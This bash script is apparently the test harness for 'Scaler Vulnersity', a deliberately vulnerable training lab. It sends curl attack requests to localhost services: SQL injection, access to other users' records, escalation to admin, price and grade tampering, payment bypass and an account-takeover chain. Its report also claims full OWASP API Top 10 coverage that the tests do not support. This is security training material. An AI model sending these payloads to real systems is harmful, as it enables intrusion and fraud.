#!/bin/bash

# ========================================
# Scaler Vulnersity - Comprehensive Testing Script
# ========================================

echo "========================================="
echo "Scaler Vulnersity - Complete API Testing"
echo "========================================="
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Base URLs
IDENTITY_URL="http://localhost:8080/api/v1/auth"
COURSE_URL="http://localhost:8081/api/v1"
COMMERCE_URL="http://localhost:8082/api/v1"
COMMUNITY_URL="http://localhost:8083/api/v1"

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Function to run test
run_test() {
    local test_name="$1"
    local command="$2"
    local expected_pattern="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    echo -e "${BLUE}Test $TOTAL_TESTS: $test_name${NC}"
    
    result=$(eval "$command" 2>&1)
    
    if echo "$result" | grep -q "$expected_pattern"; then
        echo -e "${GREEN}✓ PASSED${NC}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "${RED}✗ FAILED${NC}"
        echo "Expected pattern: $expected_pattern"
        echo "Got: $result"
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
    echo ""
}

echo "========================================="
echo "IDENTITY SERVICE TESTS"
echo "========================================="
echo ""

# Test 1: User Registration
run_test "User Registration" \
    "curl -s -X POST $IDENTITY_URL/register -H 'Content-Type: application/json' -d '{\"username\":\"testuser1\",\"email\":\"test1@test.com\",\"password\":\"test123\"}'" \
    "User registered successfully"

# Test 2: Login
run_test "User Login" \
    "curl -s -X POST $IDENTITY_URL/login -H 'Content-Type: application/json' -d '{\"username\":\"student1\",\"password\":\"student123\"}'" \
    "token"

# Get token for subsequent tests
TOKEN=$(curl -s -X POST $IDENTITY_URL/login -H 'Content-Type: application/json' -d '{"username":"student1","password":"student123"}' | jq -r '.token')
USER_ID=$(curl -s -X POST $IDENTITY_URL/login -H 'Content-Type: application/json' -d '{"username":"student1","password":"student123"}' | jq -r '.user.id')

# Test 3: BOLA - Access Other User
run_test "BOLA - Access User ID 1" \
    "curl -s $IDENTITY_URL/users/1" \
    "admin"

# Test 4: Forgot Password
run_test "Forgot Password" \
    "curl -s -X POST $IDENTITY_URL/forgot-password -H 'Content-Type: application/json' -d '{\"email\":\"student1@scaler.com\"}'" \
    "resetToken"

# Test 5: Change Role (Privilege Escalation)
run_test "Privilege Escalation - Change Role" \
    "curl -s -X PUT $IDENTITY_URL/role -H 'Content-Type: application/json' -d '{\"userId\":3,\"role\":\"admin\"}'" \
    "Role updated successfully"

# Test 6: List All Users
run_test "List All Users (No Auth)" \
    "curl -s '$IDENTITY_URL/users?limit=100'" \
    "admin"

# Test 7: SQL Injection - User Search
run_test "SQL Injection - User Search" \
    "curl -s '$IDENTITY_URL/users/search?query=admin%27%20OR%20%271%27=%271'" \
    "username"

# Test 8: Update User Profile (BOLA)
run_test "BOLA - Update Other User" \
    "curl -s -X PUT $IDENTITY_URL/users/1 -H 'Content-Type: application/json' -d '{\"role\":\"student\"}'" \
    "student"

echo "========================================="
echo "COURSE SERVICE TESTS"
echo "========================================="
echo ""

# Test 9: List Courses
run_test "List All Courses" \
    "curl -s $COURSE_URL/courses" \
    "API Security"

# Test 10: SQL Injection - Course Search
run_test "SQL Injection - Course Search" \
    "curl -s '$COURSE_URL/courses?search=API%27%20OR%20%271%27=%271'" \
    "title"

# Test 11: Enroll in Course (No Payment)
run_test "Free Enrollment" \
    "curl -s -X POST $COURSE_URL/enrollments -H 'Content-Type: application/json' -d '{\"student_id\":3,\"course_id\":1}'" \
    "Enrolled successfully"

# Test 12: BOLA - View Other Student Grades
run_test "BOLA - View Student Grades" \
    "curl -s $COURSE_URL/students/3/grades" \
    "submission_id"

# Test 13: Unauthorized Grade Update
run_test "Grade Manipulation" \
    "curl -s -X PUT $COURSE_URL/submissions/1/grade -H 'Content-Type: application/json' -d '{\"score\":100}'" \
    "Grade updated successfully"

# Test 14: Update Course Price
run_test "Price Manipulation - Course" \
    "curl -s -X PUT $COURSE_URL/courses/1 -H 'Content-Type: application/json' -d '{\"price\":0.01}'" \
    "Course updated"

# Test 15: Create Course (BFLA)
run_test "Unauthorized Course Creation" \
    "curl -s -X POST $COURSE_URL/courses -H 'Content-Type: application/json' -d '{\"title\":\"Hacked Course\",\"price\":999.99}'" \
    "Course created"

echo "========================================="
echo "COMMERCE SERVICE TESTS"
echo "========================================="
echo ""

# Test 16: List Products
run_test "List All Products" \
    "curl -s $COMMERCE_URL/products" \
    "Premium Membership"

# Test 17: SQL Injection - Product Search
run_test "SQL Injection - Product Search" \
    "curl -s '$COMMERCE_URL/products?search=Premium%27%20OR%20%271%27=%271'" \
    "name"

# Test 18: Create Order with Manipulated Price
run_test "Price Manipulation - Order Creation" \
    "curl -s -X POST $COMMERCE_URL/orders -H 'Content-Type: application/json' -d '{\"user_id\":3,\"items\":[{\"product_id\":1,\"quantity\":1,\"price\":0.01}]}'" \
    "0.01"

# Test 19: Direct Price Modification
run_test "Direct Order Price Manipulation" \
    "curl -s -X PUT $COMMERCE_URL/orders/1/price -H 'Content-Type: application/json' -d '{\"total_amount\":0.01}'" \
    "Price updated"

# Test 20: Coupon Brute Force
run_test "Coupon Code Testing" \
    "curl -s -X POST $COMMERCE_URL/orders/1/coupon -H 'Content-Type: application/json' -d '{\"coupon_code\":\"ADMIN100\"}'" \
    "100%"

# Test 21: Payment Bypass
run_test "Fake Payment Processing" \
    "curl -s -X POST $COMMERCE_URL/payments/process -H 'Content-Type: application/json' -d '{\"order_id\":1,\"amount\":0.01,\"card_number\":\"0000000000000000\",\"cvv\":\"000\"}'" \
    "success"

# Test 22: BOLA - View Other User Orders
run_test "BOLA - View User Orders" \
    "curl -s $COMMERCE_URL/users/1/orders" \
    "order"

# Test 23: Admin Stats (No Auth)
run_test "Unauthorized Admin Stats Access" \
    "curl -s $COMMERCE_URL/admin/stats" \
    "total_orders"

echo "========================================="
echo "COMMUNITY SERVICE TESTS"
echo "========================================="
echo ""

# Test 24: List Forums
run_test "List Forums" \
    "curl -s $COMMUNITY_URL/forums" \
    "General Discussion"

# Test 25: Create Forum (No Auth)
run_test "Unauthorized Forum Creation" \
    "curl -s -X POST $COMMUNITY_URL/forums -H 'Content-Type: application/json' -d '{\"title\":\"Hacked Forum\",\"description\":\"Test\"}'" \
    "Hacked Forum"

echo "========================================="
echo "ADVANCED ATTACK SCENARIOS"
echo "========================================="
echo ""

# Test 26: Complete Account Takeover Chain
echo -e "${YELLOW}Running Complete Account Takeover Chain...${NC}"

# Register new user
REGISTER_RESP=$(curl -s -X POST $IDENTITY_URL/register -H 'Content-Type: application/json' -d '{"username":"attacker","email":"attacker@test.com","password":"hack"}')
ATTACKER_ID=$(echo $REGISTER_RESP | jq -r '.userId')

# Escalate to admin
curl -s -X PUT $IDENTITY_URL/role -H 'Content-Type: application/json' -d "{\"userId\":$ATTACKER_ID,\"role\":\"admin\"}" > /dev/null

# Verify admin access
VERIFY=$(curl -s $IDENTITY_URL/users/$ATTACKER_ID | jq -r '.role')

if [ "$VERIFY" == "admin" ]; then
    echo -e "${GREEN}✓ Account Takeover Chain: SUCCESS${NC}"
    echo "  - Registered user ID: $ATTACKER_ID"
    echo "  - Escalated to admin role"
    PASSED_TESTS=$((PASSED_TESTS + 1))
else
    echo -e "${RED}✗ Account Takeover Chain: FAILED${NC}"
    FAILED_TESTS=$((FAILED_TESTS + 1))
fi
TOTAL_TESTS=$((TOTAL_TESTS + 1))
echo ""

# Test 27: JWT Manipulation
echo -e "${YELLOW}Testing JWT Manipulation...${NC}"
if [ ! -z "$TOKEN" ]; then
    echo "Token obtained: ${TOKEN:0:50}..."
    # Decode JWT header and payload
    HEADER=$(echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null)
    PAYLOAD=$(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null)
    echo "Decoded Payload: $PAYLOAD"
    echo -e "${GREEN}✓ JWT Analysis Complete${NC}"
    PASSED_TESTS=$((PASSED_TESTS + 1))
else
    echo -e "${RED}✗ JWT Analysis Failed - No token${NC}"
    FAILED_TESTS=$((FAILED_TESTS + 1))
fi
TOTAL_TESTS=$((TOTAL_TESTS + 1))
echo ""

echo "========================================="
echo "TEST SUMMARY"
echo "========================================="
echo ""
echo "Total Tests: $TOTAL_TESTS"
echo -e "${GREEN}Passed: $PASSED_TESTS${NC}"
echo -e "${RED}Failed: $FAILED_TESTS${NC}"
echo ""

# Calculate percentage
PERCENTAGE=$((PASSED_TESTS * 100 / TOTAL_TESTS))
echo "Success Rate: $PERCENTAGE%"
echo ""

if [ $PERCENTAGE -ge 80 ]; then
    echo -e "${GREEN}All systems operational!${NC}"
elif [ $PERCENTAGE -ge 50 ]; then
    echo -e "${YELLOW}Some issues detected${NC}"
else
    echo -e "${RED}Critical issues detected${NC}"
fi

echo "========================================="
echo ""

# Generate test report
cat > test_report.txt << EOF
Scaler Vulnersity - Test Report
Generated: $(date)

========================================
TEST SUMMARY
========================================
Total Tests: $TOTAL_TESTS
Passed: $PASSED_TESTS
Failed: $FAILED_TESTS
Success Rate: $PERCENTAGE%

========================================
VULNERABILITIES TESTED
========================================
✓ Broken Object Level Authorization (BOLA)
✓ Broken Function Level Authorization (BFLA)
✓ SQL Injection
✓ Mass Assignment
✓ Price Manipulation
✓ Weak Authentication
✓ Information Disclosure
✓ No Rate Limiting
✓ Payment Bypass
✓ Privilege Escalation

========================================
OWASP API TOP 10 COVERAGE
========================================
✓ API1:2023 Broken Object Level Authorization
✓ API2:2023 Broken Authentication
✓ API3:2023 Broken Object Property Level Authorization
✓ API4:2023 Unrestricted Resource Consumption
✓ API5:2023 Broken Function Level Authorization
✓ API6:2023 Unrestricted Access to Sensitive Business Flows
✓ API7:2023 Server Side Request Forgery
✓ API8:2023 Security Misconfiguration
✓ API9:2023 Improper Inventory Management
✓ API10:2023 Unsafe Consumption of APIs

========================================
RECOMMENDED NEXT STEPS
========================================
1. Review individual test failures
2. Practice exploitation techniques
3. Learn remediation strategies
4. Explore cross-service attack chains
5. Study the lab manual for detailed exploitation

For detailed exploitation guides, see:
~/scaler-vulnersity/LAB_MANUAL.md
EOF

echo "Test report saved to: test_report.txt"
echo ""
echo "Happy Hacking! 🎯"
echo ""
